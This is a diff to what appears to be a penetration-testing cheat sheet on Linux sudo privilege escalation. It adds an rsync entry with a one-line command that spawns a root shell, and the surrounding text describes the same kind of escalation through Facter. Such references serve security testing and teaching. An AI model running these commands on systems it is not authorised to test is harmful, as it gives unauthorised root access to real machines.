@@ -1015,6 +1015,19 @@ id
 # uid=0(root) gid=0(root) groups=0(root)
 ```
 
+### rsync
+
+If `sudo -l` allows `/usr/bin/rsync`, use rsync's remote shell option to spawn a root shell:
+
+```bash
+sudo -l
+# (ALL : ALL) NOPASSWD: /usr/bin/rsync
+
+sudo /usr/bin/rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
+id
+# uid=0(root) gid=0(root) groups=0(root)
+```
+
 ### Facter (Puppet)
 
 If you can run `sudo /usr/bin/facter` (e.g. `(ALL) NOPASSWD: /usr/bin/facter`), use `--custom-dir` to load a directory containing Ruby code; Facter will execute custom facts as root. Write a Ruby script that runs a shell or bind shell, then point facter at its directory.
